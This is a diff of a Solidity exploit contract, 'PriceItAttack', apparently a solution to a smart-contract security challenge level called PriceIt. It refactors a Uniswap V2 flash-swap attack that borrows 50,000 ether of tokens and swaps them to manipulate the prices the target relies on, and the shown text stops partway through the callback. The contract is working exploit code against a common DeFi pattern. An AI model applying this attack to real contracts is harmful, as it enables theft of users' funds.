@@ -7,24 +7,16 @@ import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
 import '../levels/PriceIt.sol';
 
 contract PriceItAttack {
-  IUniswapV2Factory private uniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
-  IUniswapV2Router02 private uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-  IERC20 private token0;
-  IERC20 private token1;
-  IERC20 private token2;
-  IUniswapV2Pair private token0Token2Pair;
-  PriceIt private instance;
-  address private attacker;
+  IUniswapV2Factory private constant uniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+  IUniswapV2Router02 private constant uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
-  function doYourThing(PriceIt _instance) external {
-    attacker = msg.sender;
-    instance = _instance;
-    token0 = instance.token0();
-    token1 = instance.token1();
-    token2 = instance.token2();
-    token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
+  function doYourThing(PriceIt instance) external {
+    IERC20 token0 = instance.token0();
+    IERC20 token1 = instance.token1();
+    IERC20 token2 = instance.token2();
+    IUniswapV2Pair token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
     uint256 flashSwapAmount = 50000 ether;
-    bytes memory data = abi.encode(token0, token1, token2, token0Token2Pair, flashSwapAmount, _instance, msg.sender);
+    bytes memory data = abi.encode(token0, token1, token0Token2Pair, flashSwapAmount, instance, msg.sender);
     if (address(token0) < address(token2)) {
       IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
     } else {
@@ -34,12 +26,18 @@ contract PriceItAttack {
 
   function uniswapV2Call(
     address,
-    uint256 amount0Out,
-    uint256 amount1Out,
-    bytes calldata
+    uint256,
+    uint256,
+    bytes calldata data
   ) external {
-
-    uint256 flashSwapAmount = amount0Out > 0 ? amount0Out : amount1Out;
+    (
+      IERC20 token0,
+      IERC20 token1,
+      IUniswapV2Pair token0Token2Pair,
+      uint256 flashSwapAmount,
+      PriceIt instance,
+      address attacker
+    ) = abi.decode(data, (IERC20, IERC20, IUniswapV2Pair, uint256, PriceIt, address));
     token0.approve(address(uniRouter), flashSwapAmount);
     uint256 token1Output = swapTwoTokens(token0, token1, flashSwapAmount);
     token1.approve(address(instance), token1Output);
